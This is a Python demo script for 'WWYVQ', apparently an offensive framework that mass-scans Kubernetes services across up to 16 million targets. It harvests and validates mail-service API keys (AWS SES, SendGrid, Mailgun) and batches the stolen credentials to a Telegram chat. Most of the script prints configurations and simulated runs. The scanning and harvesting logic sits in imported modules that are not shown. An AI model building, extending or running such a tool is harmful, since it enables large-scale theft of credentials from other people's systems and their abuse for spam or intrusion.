#!/usr/bin/env python3
"""
🚀 WWYVQ Large Scale Example - 16M+ Targets Support Demo
Author: wKayaa
Date: 2025-01-17

This example demonstrates how to use the optimized WWYVQ system
for processing 16+ million targets efficiently.
"""

import asyncio
import sys
import time
from pathlib import Path
from datetime import datetime
from typing import List

# Add the project root to path
sys.path.insert(0, str(Path(__file__).parent))

# Import optimized components
from k8s_scanner_ultimate import K8sUltimateScanner, ScannerConfig, ScanMode, ValidationType
from telegram_mail_enhanced import TelegramMailNotifier, TelegramRateLimitConfig
from config.config_loader import ConfigurationLoader, load_optimized_config
from wwyvq_master_final import WWYVQMasterFramework


class LargeScaleDemo:
    """Demonstration of large-scale WWYVQ capabilities"""
    
    def __init__(self):
        self.config_loader = ConfigurationLoader()
        self.session_id = f"demo_{int(time.time())}"
        
    async def demo_small_scale(self):
        """Demo with small scale (1K targets) for testing"""
        print("\n" + "="*60)
        print("🧪 SMALL SCALE DEMO - 1,000 Targets")
        print("="*60)
        
        # Create test targets
        targets = [f"192.168.{i}.{j}" for i in range(1, 5) for j in range(1, 251)]
        
        # Load optimized configuration
        config = load_optimized_config(len(targets))
        if not config:
            print("❌ Failed to load configuration")
            return
        
        # Display configuration
        scanner_config = config['scanner_config']
        print(f"📊 Configuration:")
        print(f"├── Mode: {scanner_config.mode.value}")
        print(f"├── Max Concurrent: {scanner_config.max_concurrent}")
        print(f"├── Batch Size: {scanner_config.batch_size}")
        print(f"├── Large Scale Mode: {scanner_config.large_scale_mode}")
        print(f"└── Memory Limit: {scanner_config.memory_limit_mb} MB")
        
        # Initialize scanner
        scanner = K8sUltimateScanner(scanner_config)
        
        # Run scan
        start_time = time.time()
        print(f"\n🚀 Starting scan of {len(targets):,} targets...")
        
        try:
            results = await scanner.scan_targets(targets)
            duration = time.time() - start_time
            
            print(f"\n✅ Scan completed in {duration:.1f}s")
            print(f"📊 Results: {len(results)} services found")
            print(f"⚡ Rate: {len(targets)/duration:.1f} targets/sec")
            
        except Exception as e:
            print(f"❌ Scan failed: {e}")
    
    async def demo_medium_scale(self):
        """Demo with medium scale (100K targets) simulation"""
        print("\n" + "="*60)
        print("🔧 MEDIUM SCALE DEMO - 100,000 Targets (Simulated)")
        print("="*60)
        
        target_count = 100000
        
        # Load optimized configuration
        config = load_optimized_config(target_count)
        if not config:
            print("❌ Failed to load configuration")
            return
        
        # Display optimizations
        scanner_config = config['scanner_config']
        print(f"📊 Optimized Configuration:")
        print(f"├── Mode: {scanner_config.mode.value}")
        print(f"├── Max Concurrent: {scanner_config.max_concurrent}")
        print(f"├── Batch Size: {scanner_config.batch_size}")
        print(f"├── Large Scale Mode: {scanner_config.large_scale_mode}")
        print(f"├── Connection Pool: {scanner_config.connection_pool_size}")
        print(f"├── Memory Limit: {scanner_config.memory_limit_mb} MB")
        print(f"└── Adaptive Rate Limiting: {scanner_config.enable_adaptive_rate_limiting}")
        
        # Show system recommendations
        recommendations = config['system_recommendations']
        print(f"\n💡 System Recommendations:")
        print(f"├── CPU Cores: {recommendations['cpu_cores']}")
        print(f"├── Memory: {recommendations['memory_gb']} GB")
        print(f"├── Network: {recommendations['network_bandwidth']}")
        print(f"└── Storage: {recommendations['storage_capacity']} {recommendations['storage_type']}")
        
        # Simulate batch processing
        print(f"\n🔄 Simulating batch processing...")
        batch_size = scanner_config.batch_size
        total_batches = (target_count + batch_size - 1) // batch_size
        
        for batch_num in range(1, min(6, total_batches + 1)):  # Show first 5 batches
            print(f"├── Batch {batch_num}/{total_batches}: Processing {batch_size:,} targets")
            await asyncio.sleep(0.1)  # Simulate processing time
        
        if total_batches > 5:
            print(f"├── ... {total_batches - 5} more batches")
        
        estimated_time = target_count / 1000  # Assume 1000 targets/sec
        print(f"\n⏱️ Estimated completion time: {estimated_time:.1f}s ({estimated_time/60:.1f} min)")
    
    async def demo_telegram_features(self):
        """Demo Telegram rate limiting and batch notifications"""
        print("\n" + "="*60)
        print("📱 TELEGRAM OPTIMIZATION DEMO")
        print("="*60)
        
        # Create Telegram config
        telegram_config = TelegramRateLimitConfig(
            max_messages_per_minute=20,
            max_messages_per_hour=200,
            batch_size=10,
            batch_interval=30,
            enable_batching=True
        )
        
        # Initialize notifier (without real credentials for demo)
        notifier = TelegramMailNotifier(
            token="demo_token",
            chat_id="demo_chat",
            config=telegram_config
        )
        notifier.enabled = False  # Disable actual sending for demo
        
        print(f"📊 Telegram Configuration:")
        print(f"├── Max Messages/Minute: {telegram_config.max_messages_per_minute}")
        print(f"├── Max Messages/Hour: {telegram_config.max_messages_per_hour}")
        print(f"├── Batch Size: {telegram_config.batch_size}")
        print(f"├── Batch Interval: {telegram_config.batch_interval}s")
        print(f"└── Batching Enabled: {telegram_config.enable_batching}")
        
        # Simulate credential discoveries
        print(f"\n🔍 Simulating credential discoveries...")
        
        demo_credentials = [
            {"service": "AWS_SES_SNS", "type": "api_key", "value": "AKIA...", "validated": True},
            {"service": "SENDGRID", "type": "api_key", "value": "SG...", "validated": True},
            {"service": "MAILGUN", "type": "api_key", "value": "key-...", "validated": False},
        ]
        
        for i, cred in enumerate(demo_credentials):
            print(f"├── Credential {i+1}: {cred['service']} ({'✅' if cred['validated'] else '❌'})")
            # This would normally send to Telegram
            # await notifier.send_mail_credential_alert(cred)
        
        print(f"\n📊 With batching enabled:")
        print(f"├── Individual alerts: Disabled")
        print(f"├── Batch notifications: Every {telegram_config.batch_size} credentials")
        print(f"├── Progress updates: Every {telegram_config.progress_interval:,} targets")
        print(f"└── Rate limiting: Automatic")
    
    async def demo_system_analysis(self):
        """Demo system configuration analysis"""
        print("\n" + "="*60)
        print("🔧 SYSTEM ANALYSIS DEMO")
        print("="*60)
        
        # Test different target counts
        test_scenarios = [
            ("Small Scale", 10000),
            ("Medium Scale", 100000),
            ("Large Scale", 1000000),
            ("Ultra Scale", 10000000),
            ("Mega Scale", 16000000)
        ]
        
        for scenario_name, target_count in test_scenarios:
            print(f"\n📊 {scenario_name} ({target_count:,} targets):")
            
            config = load_optimized_config(target_count)
            if config:
                scanner_config = config['scanner_config']
                recommendations = config['system_recommendations']
                
                print(f"├── Scanning Mode: {scanner_config.mode.value}")
                print(f"├── Concurrent Threads: {scanner_config.max_concurrent:,}")
                print(f"├── Batch Size: {scanner_config.batch_size:,}")
                print(f"├── Recommended CPU: {recommendations['cpu_cores']}")
                print(f"├── Recommended RAM: {recommendations['memory_gb']} GB")
                print(f"└── Est. Processing Time: {target_count/1000/60:.1f} min")
        
        # Current system validation
        print(f"\n🔍 Current System Validation:")
        validation = self.config_loader.validate_system_configuration()
        
        for check, result in validation.items():
            if result is None:
                status = "⚠️ Unable to check"
            elif result:
                status = "✅ OK"
            else:
                status = "❌ Insufficient"
            print(f"├── {check.replace('_', ' ').title()}: {status}")
    
    async def demo_master_framework_integration(self):
        """Demo integration with master framework"""
        print("\n" + "="*60)
        print("🎯 MASTER FRAMEWORK INTEGRATION DEMO")
        print("="*60)
        
        print("📊 Master Framework Features:")
        print("├── ✅ Ultimate Mode with Large Scale Support")
        print("├── ✅ Enhanced Telegram Notifications")
        print("├── ✅ Real-time Statistics Tracking")
        print("├── ✅ Automatic Configuration Optimization")
        print("├── ✅ Progress Updates for Large Scans")
        print("├── ✅ Batch Credential Processing")
        print("├── ✅ Memory Monitoring and Management")
        print("└── ✅ Checkpoint Recovery System")
        
        print(f"\n🔧 Integration Points:")
        print("├── K8s Ultimate Scanner: Optimized for 16M+ targets")
        print("├── Telegram Notifier: Rate-limited batch notifications")
        print("├── Configuration Loader: Auto-scaling based on target count")
        print("├── Checkpoint Manager: Enhanced for large-scale recovery")
        print("└── Performance Monitor: Real-time stats and optimization")
        
        # Simulate a master framework run
        print(f"\n🚀 Simulating Master Framework Ultimate Mode:")
        print("├── Loading large-scale configuration...")
        await asyncio.sleep(0.5)
        print("├── Optimizing scanner for target count...")
        await asyncio.sleep(0.5)
        print("├── Initializing enhanced Telegram notifications...")
        await asyncio.sleep(0.5)
        print("├── Starting large-scale scan with optimizations...")
        await asyncio.sleep(0.5)
        print("├── Processing targets in optimized batches...")
        await asyncio.sleep(0.5)
        print("├── Sending progress updates...")
        await asyncio.sleep(0.5)
        print("└── ✅ Integration test completed successfully!")
    
    async def run_all_demos(self):
        """Run all demonstration scenarios"""
        print("🚀 WWYVQ LARGE SCALE OPTIMIZATION DEMO")
        print(f"Session ID: {self.session_id}")
        print(f"Timestamp: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
        
        # Run all demos
        await self.demo_system_analysis()
        await self.demo_telegram_features()
        await self.demo_medium_scale()
        await self.demo_master_framework_integration()
        
        # Only run small scale demo if requested
        import os
        if os.getenv("RUN_ACTUAL_SCAN"):
            await self.demo_small_scale()
        else:
            print("\n💡 To run actual scanning demo, set RUN_ACTUAL_SCAN=1")
        
        print(f"\n🎉 All demonstrations completed successfully!")
        print("="*60)


async def main():
    """Main demo function"""
    demo = LargeScaleDemo()
    await demo.run_all_demos()


if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                     🚀 WWYVQ LARGE SCALE DEMO 🚀                            ║
║                                                                              ║
║  Demonstrates optimizations for processing 16+ million targets efficiently  ║
║                                                                              ║
║  Features:                                                                   ║
║  • 10,000+ concurrent thread support                                        ║
║  • Intelligent rate limiting and batching                                   ║
║  • Memory monitoring and optimization                                       ║
║  • Enhanced Telegram notifications                                          ║
║  • Automatic configuration scaling                                          ║
║  • Real-time performance statistics                                         ║
║                                                                              ║
║                              Author: wKayaa                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹️ Demo interrupted by user")
    except Exception as e:
        print(f"\n❌ Demo error: {e}")
        import traceback
        traceback.print_exc()